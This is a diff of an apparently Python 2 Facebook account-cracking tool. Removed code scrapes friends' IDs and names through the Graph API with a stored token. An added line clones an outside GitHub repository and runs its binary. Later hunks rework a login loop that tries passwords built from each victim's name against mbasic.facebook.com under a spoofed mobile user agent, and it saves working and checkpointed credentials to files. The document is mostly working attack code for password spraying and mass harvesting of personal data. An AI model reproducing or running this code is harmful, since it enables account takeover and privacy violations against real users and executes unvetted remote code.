-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    my_line = file.readline()
-    count.append(my_line)
-    print g + '[*] Extracting From IMTIAZ : ' + my_line[:15]
-    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open('jok.txt', 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    print ''
-    print ''
-    print sm + '[*] Total Extract ids : ' + str(len(count)) + w
-    print ''
-    mvt = raw_input('[=] Enter Path To Save File : ')
-    print '[*] Your File Save in : ' + mvt
-    shutil.move(hok, mvt)
-    os.system('rm -rf jok.txt')
-    raw_input('[=] Press Enter To Back')
-    main_system()
-
-file = 'file.txt'
-
-def ext1():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print ' [*] Your File Save In : ' + cop
-    raw_input('[!] Press Enter To Back')
-    main_system()
-
-
-def ext2():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext3():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext4():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    d4 = raw_input('[4] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
-    z = json.loads(r4.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[*] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext5():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    d4 = raw_input('[4] Enter ID : ')
-    d5 = raw_input('[5] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
-    z = json.loads(r4.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
-    z = json.loads(r5.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext6():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    d4 = raw_input('[4] Enter ID : ')
-    d5 = raw_input('[5] Enter ID : ')
-    d6 = raw_input('[6] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
-    z = json.loads(r4.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
-    z = json.loads(r5.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
-    z = json.loads(r6.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext7():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    d4 = raw_input('[4] Enter ID : ')
-    d5 = raw_input('[5] Enter ID : ')
-    d6 = raw_input('[6] Enter ID : ')
-    d7 = raw_input('[7] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
-    z = json.loads(r4.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
-    z = json.loads(r5.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
-    z = json.loads(r6.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
-    z = json.loads(r7.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext8():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    d4 = raw_input('[4] Enter ID : ')
-    d5 = raw_input('[5] Enter ID : ')
-    d6 = raw_input('[6] Enter ID : ')
-    d7 = raw_input('[7] Enter ID : ')
-    d8 = raw_input('[8] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
-    z = json.loads(r4.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
-    z = json.loads(r5.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
-    z = json.loads(r6.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
-    z = json.loads(r7.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
-    z = json.loads(r8.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext9():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    d4 = raw_input('[4] Enter ID : ')
-    d5 = raw_input('[5] Enter ID : ')
-    d6 = raw_input('[6] Enter ID : ')
-    d7 = raw_input('[7] Enter ID : ')
-    d8 = raw_input('[8] Enter ID : ')
-    d9 = raw_input('[9] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
-    z = json.loads(r4.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
-    z = json.loads(r5.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
-    z = json.loads(r6.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
-    z = json.loads(r7.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
-    z = json.loads(r8.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r9 = requests.get('https://graph.facebook.com/' + d9 + '/friends?access_token=' + token)
-    z = json.loads(r9.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
-    main_system()
-
-
-def ext10():
-    rana = []
-    
-    try:
-        token = open('token.txt').read()
-    except:
-        main_system()
-
-    print ''
-    d1 = raw_input('[1] Enter ID : ')
-    d2 = raw_input('[2] Enter ID : ')
-    d3 = raw_input('[3] Enter ID : ')
-    d4 = raw_input('[4] Enter ID : ')
-    d5 = raw_input('[5] Enter ID : ')
-    d6 = raw_input('[6] Enter ID : ')
-    d7 = raw_input('[7] Enter ID : ')
-    d8 = raw_input('[8] Enter ID : ')
-    d9 = raw_input('[9] Enter ID : ')
-    d10 = raw_input('[10] Enter ID : ')
-    r = requests.get('https://graph.facebook.com/' + d1 + '/friends?access_token=' + token)
-    z = json.loads(r.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r2 = requests.get('https://graph.facebook.com/' + d2 + '/friends?access_token=' + token)
-    z = json.loads(r2.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r3 = requests.get('https://graph.facebook.com/' + d3 + '/friends?access_token=' + token)
-    z = json.loads(r3.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r4 = requests.get('https://graph.facebook.com/' + d4 + '/friends?access_token=' + token)
-    z = json.loads(r4.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r5 = requests.get('https://graph.facebook.com/' + d5 + '/friends?access_token=' + token)
-    z = json.loads(r5.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r6 = requests.get('https://graph.facebook.com/' + d6 + '/friends?access_token=' + token)
-    z = json.loads(r6.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r7 = requests.get('https://graph.facebook.com/' + d7 + '/friends?access_token=' + token)
-    z = json.loads(r7.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r8 = requests.get('https://graph.facebook.com/' + d8 + '/friends?access_token=' + token)
-    z = json.loads(r8.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r9 = requests.get('https://graph.facebook.com/' + d9 + '/friends?access_token=' + token)
-    z = json.loads(r9.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    r10 = requests.get('https://graph.facebook.com/' + d10 + '/friends?access_token=' + token)
-    z = json.loads(r10.text)
-    fuck = open(file, 'a')
-    for i in z['data']:
-        uid = i['id']
-        na = i['name']
-        rana.append(uid + '|' + na)
-        fuck.write(uid + '|' + na + '\n')
-    
-    fuck.close()
-    cop = raw_input('[!] File path : ')
-    shutil.move(file, cop)
-    print '[*] Your File Save In : ' + cop
-    raw_input('[*] Press Enter To Back')
+    os.system('git clone https://github.com/THE-DEMON-ANNOS/Extract')
+    os.system('cd Extract && chmod +x extract && ./extract')
     main_system()
 
 
@@ -4427,7 +3257,7 @@ def c_f_p_pass():
         first = name.rsplit(' ')[0]
         
         try:
-            name = first.rsplit(' ')[1]
+            last = name.rsplit(' ')[1]
         except:
             pass
 
@@ -4441,31 +3271,81 @@ def c_f_p_pass():
             pass1 = name
             rana = requests.Session()
             rana.headers.update({
-                'Host': 'm.facebook.com',
-                'cache-control': 'max-age=0',
-                'upgrade-insecure-requests': '1',
-                'user-agent': lines,
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                'Host': 'mbasic.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                 'accept-encoding': 'gzip, deflate',
-                'upgrade-insecure-requests': str(random.randint(100, 200)),
-                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
-            p = rana.get('https://m.facebook.com')
-            b = rana.post('https://m.facebook.com/login.php', data = {
+                'accept-language': 'id-ID,id;q=0.9',
+                'referer': 'https://mbasic.facebook.com/',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]' })
+            p = rana.get('https://mbasic.facebook.com')
+            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                 'email': uid,
                 'pass': pass1,
                 'login': 'submit' })
             if 'c_user' in rana.cookies.get_dict().keys():
-                print '\x1b[1;92m[IMTIAZ-OK] ' + uid + ' | ' + pass1
-                ok = open('IMTIAZ-ok.txt', 'a')
+                print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass1
+                ok = open('/sdcard/RAJA-OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'checkpoint' in rana.cookies.get_dict().keys():
-                print '\x1b[1;91m[IMTIAZ-CP] ' + uid + ' | ' + pass1
-                cp = open('IMTIAZ-cp.txt', 'a')
+                print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass1
+                cp = open('/sdcard/RAJA-CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
+            pass2 = name + '12345'
+            rana = requests.Session()
+            rana.headers.update({
+                'Host': 'mbasic.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-encoding': 'gzip, deflate',
+                'accept-language': 'id-ID,id;q=0.9',
+                'referer': 'https://mbasic.facebook.com/',
+                'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]' })
+            p = rana.get('https://mbasic.facebook.com')
+            b = rana.post('https://mbasic.facebook.com/login.php', data = {
+                'email': uid,
+                'pass': pass2,
+                'login': 'submit' })
+            if 'c_user' in rana.cookies.get_dict().keys():
+                print '\x1b[1;92m[RAJA-OK] ' + uid + ' | ' + pass2
+                ok = open('/sdcard/RAJA-OK.txt', 'a')
+                ok.write(uid + ' | ' + pass2 + '\n')
+                ok.close()
+                oks.append(uid + pass2)
+            elif 'checkpoint' in rana.cookies.get_dict().keys():
+                print '\x1b[1;91m[RAJA-CP] ' + uid + ' | ' + pass2
+                cp = open('/sdcard/RAJA-CP.txt', 'a')
+                cp.write(uid + ' | ' + pass2 + '\n')
+                cp.close()
+                cps.append(uid + pass2)
+            pass3 = name + '123'
+            rana = requests.Session()
+            rana.headers.update({
+                'Host': 'mbasic.facebook.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-encoding': 'gzip, deflate',
+                'accept-language': 'id-ID,id;q=0.9',
+                'referer': 'https://mbasic.facebook.com/',
